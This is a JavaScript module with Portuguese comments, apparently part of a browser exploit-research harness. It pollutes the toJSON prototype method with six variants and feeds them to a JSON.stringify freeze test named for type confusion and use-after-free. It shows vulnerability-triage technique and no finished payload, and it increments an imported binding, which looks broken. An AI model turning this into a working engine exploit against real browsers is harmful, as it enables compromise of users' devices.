// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeFullFreezeScenarioTest, currentCallCount_toJSON } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs';
import { toHex } from '../utils.mjs';

const ppKeyConst = 'toJSON';
const EARLY_CALL_LOG_MAX = 3; // Para logar detalhes apenas nas primeiras X chamadas do toJSON

// --- DEFINIÇÕES DAS VARIANTES DA FUNÇÃO toJSON ---

// Variante 1: Lógica "v2 - Refinado Congelante" (baseada na sua descrição)
function toJSON_Variant1_FullRefined() {
    currentCallCount_toJSON++; 
    const currentOperationThis = this;
    const FNAME_toJSON = `toJSON_V1_Full(Call ${currentCallCount_toJSON})`;
    if (currentCallCount_toJSON === 1) document.title = `toJSON Call ${currentCallCount_toJSON} (V1_FullRefined)`;
    
    if (currentCallCount_toJSON <= EARLY_CALL_LOG_MAX) {
      logS3(`[${ppKeyConst} Poluído - V1] ${FNAME_toJSON} Chamado! typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "vuln");
    }

    let details = { byteLength: "N/A", first_dword: "N/A", slice_exists: "N/A" };
    try {
        // Acesso 1: byteLength
        details.byteLength = currentOperationThis.byteLength;
        
        // Acesso 2: DataView e leitura de dword (parte complexa)
        if (currentOperationThis && typeof currentOperationThis.byteLength === 'number' && currentOperationThis.byteLength >= 4 && (currentOperationThis instanceof ArrayBuffer || (currentOperationThis.buffer instanceof ArrayBuffer && currentOperationThis.byteOffset !== undefined))) {
            let bufferToView = (currentOperationThis instanceof ArrayBuffer) ? currentOperationThis : currentOperationThis.buffer;
            let offsetInView = (currentOperationThis instanceof ArrayBuffer) ? 0 : currentOperationThis.byteOffset;
            if (bufferToView.byteLength >= offsetInView + 4) {
               details.first_dword = new DataView(bufferToView, offsetInView, 4).getUint32(0, true);
            }
        }
        // Acesso 3: Checagem do método slice
        details.slice_exists = (typeof currentOperationThis.slice === 'function');

        if (currentCallCount_toJSON <= EARLY_CALL_LOG_MAX) {
            logS3(`  [CALL ${currentCallCount_toJSON}] Detalhes V1: byteLength=${details.byteLength}, 1stDword=${(details.first_dword === "N/A" || typeof details.first_dword === 'string') ? details.first_dword : toHex(details.first_dword)}, slice_exists=${details.slice_exists}`, "info");
        }
        return { toJSON_executed_V1: true, details_byteLength: details.byteLength, call: currentCallCount_toJSON };
    } catch (e) {
        logS3(`  [${ppKeyConst} Poluído - V1] ${FNAME_toJSON} ERRO: ${e.message}`, "critical");
        document.title = `ERRO toJSON Call ${currentCallCount_toJSON} (V1)`;
        return { toJSON_error_V1: true, message: e.message, call: currentCallCount_toJSON };
    }
}

// Variante 2: Sem new DataView / first_dword
function toJSON_Variant2_NoDataView() {
    currentCallCount_toJSON++;
    const currentOperationThis = this;
    const FNAME_toJSON = `toJSON_V2_NoDataView(Call ${currentCallCount_toJSON})`;
    if (currentCallCount_toJSON === 1) document.title = `toJSON Call ${currentCallCount_toJSON} (V2_NoDataView)`;
    if (currentCallCount_toJSON <= EARLY_CALL_LOG_MAX) logS3(`[${ppKeyConst} Poluído - V2] ${FNAME_toJSON} Chamado! typeof this: ${typeof currentOperationThis}`, "vuln");
    try {
        // Acesso 1: byteLength
        let details = { byteLength: currentOperationThis.byteLength, 
                        // Acesso 2: Checagem do método slice
                        slice_exists: (typeof currentOperationThis.slice === 'function') };
        if (currentCallCount_toJSON <= EARLY_CALL_LOG_MAX) logS3(`  [CALL ${currentCallCount_toJSON}] Detalhes V2: byteLength=${details.byteLength}, slice_exists=${details.slice_exists}`, "info");
        return { toJSON_executed_V2: true, details_byteLength: details.byteLength, call: currentCallCount_toJSON };
    } catch (e) {
        logS3(`  [${ppKeyConst} Poluído - V2] ${FNAME_toJSON} ERRO: ${e.message}`, "critical");
        document.title = `ERRO toJSON Call ${currentCallCount_toJSON} (V2)`;
        return { toJSON_error_V2: true, message: e.message, call: currentCallCount_toJSON };
    }
}

// Variante 3: Sem DataView e sem slice check
function toJSON_Variant3_NoDataView_NoSlice() {
    currentCallCount_toJSON++;
    const currentOperationThis = this;
    const FNAME_toJSON = `toJSON_V3_NoDataView_NoSlice(Call ${currentCallCount_toJSON})`;
    if (currentCallCount_toJSON === 1) document.title = `toJSON Call ${currentCallCount_toJSON} (V3_NoDataView_NoSlice)`;
    if (currentCallCount_toJSON <= EARLY_CALL_LOG_MAX) logS3(`[${ppKeyConst} Poluído - V3] ${FNAME_toJSON} Chamado! typeof this: ${typeof currentOperationThis}`, "vuln");
    try {
        // Acesso 1: byteLength
        let details = { byteLength: currentOperationThis.byteLength };
        if (currentCallCount_toJSON <= EARLY_CALL_LOG_MAX) logS3(`  [CALL ${currentCallCount_toJSON}] Detalhes V3: byteLength=${details.byteLength}`, "info");
        return { toJSON_executed_V3: true, details_byteLength: details.byteLength, call: currentCallCount_toJSON };
    } catch (e) {
        logS3(`  [${ppKeyConst} Poluído - V3] ${FNAME_toJSON} ERRO: ${e.message}`, "critical");
        document.title = `ERRO toJSON Call ${currentCallCount_toJSON} (V3)`;
        return { toJSON_error_V3: true, message: e.message, call: currentCallCount_toJSON };
    }
}

// Variante 4: Sem DataView, sem slice check, e sem byteLength (apenas Object.keys)
function toJSON_Variant4_OnlyObjectKeys() {
    currentCallCount_toJSON++;
    const currentOperationThis = this;
    const FNAME_toJSON = `toJSON_V4_OnlyObjectKeys(Call ${currentCallCount_toJSON})`;
    if (currentCallCount_toJSON === 1) document.title = `toJSON Call ${currentCallCount_toJSON} (V4_OnlyObjectKeys)`;
    if (currentCallCount_toJSON <= EARLY_CALL_LOG_MAX) logS3(`[${ppKeyConst} Poluído - V4] ${FNAME_toJSON} Chamado! typeof this: ${typeof currentOperationThis}`, "vuln");
    try {
        const keys = Object.keys(currentOperationThis);
        if (currentCallCount_toJSON <= EARLY_CALL_LOG_MAX) logS3(`  [CALL ${currentCallCount_toJSON}] Detalhes V4: Object.keys OK, #keys=${keys.length}`, "info");
        return { toJSON_executed_V4: true, keys_V4: keys, call: currentCallCount_toJSON };
    } catch (e) {
        logS3(`  [${ppKeyConst} Poluído - V4] ${FNAME_toJSON} ERRO: ${e.message}`, "critical");
        document.title = `ERRO toJSON Call ${currentCallCount_toJSON} (V4)`;
        return { toJSON_error_V4: true, message: e.message, call: currentCallCount_toJSON };
    }
}

// Variante 5: Loga entrada e retorna objeto vazio simples
function toJSON_Variant5_MinimalObject() {
    currentCallCount_toJSON++;
    const FNAME_toJSON = `toJSON_V5_MinimalObj(Call ${currentCallCount_toJSON})`;
    if (currentCallCount_toJSON === 1) document.title = `toJSON Call ${currentCallCount_toJSON} (V5_MinimalObject)`;
    if (currentCallCount_toJSON <= EARLY_CALL_LOG_MAX) {
      logS3(`[${ppKeyConst} Poluído - V5] ${FNAME_toJSON} Chamado!`, "vuln");
    }
    return { toJSON_executed_V5: true, call: currentCallCount_toJSON };
}

// Variante 6: Não faz nada, retorna undefined (JSON.stringify tratará como se toJSON não existisse para esse objeto)
function toJSON_Variant6_NoOp() {
    currentCallCount_toJSON++;
    const FNAME_toJSON = `toJSON_V6_NoOp(Call ${currentCallCount_toJSON})`;
    if (currentCallCount_toJSON === 1) document.title = `toJSON Call ${currentCallCount_toJSON} (V6_NoOp)`;
     if (currentCallCount_toJSON <= EARLY_CALL_LOG_MAX) {
      logS3(`[${ppKeyConst} Poluído - V6] ${FNAME_toJSON} Chamado! Retornando undefined.`, "vuln");
    }
    return undefined;
}


async function runSimplificationStepByStep_WithJSONStringify() {
    const FNAME_RUNNER = "runSimplificationStepByStep_WithJSONStringify";
    logS3(`==== INICIANDO Testes de Simplificação Iterativa do toJSON (COM JSON.stringify) ====`, 'test', FNAME_RUNNER);

    const testsToRun = [
        { desc: "V1_FullRefined_WithJSON", func: toJSON_Variant1_FullRefined },
        { desc: "V2_NoDataView_WithJSON", func: toJSON_Variant2_NoDataView },
        { desc: "V3_NoDataView_NoSlice_WithJSON", func: toJSON_Variant3_NoDataView_NoSlice },
        { desc: "V4_OnlyObjectKeys_WithJSON", func: toJSON_Variant4_OnlyObjectKeys },
        { desc: "V5_MinimalObject_WithJSON", func: toJSON_Variant5_MinimalObject },
        { desc: "V6_NoOp_WithJSON", func: toJSON_Variant6_NoOp },
    ];

    for (const test of testsToRun) {
        logS3(`\n--- Executando com toJSON Lógica: ${test.desc} ---`, 'subtest', FNAME_RUNNER);
        await executeFullFreezeScenarioTest(test.desc, test.func);
        await PAUSE_S3(MEDIUM_PAUSE_S3);
        logS3(`   Título da página após teste ${test.desc}: ${document.title}`, "info");
    }

    logS3(`==== Testes de Simplificação Iterativa do toJSON (COM JSON.stringify) CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_SimplifyToJSON_WithStringify';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Simplificação toJSON COM JSON.stringify para Congelamento ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Simplificação toJSON + Stringify";
    
    await runSimplificationStepByStep_WithJSONStringify();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Simplificação toJSON COM JSON.stringify) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
}
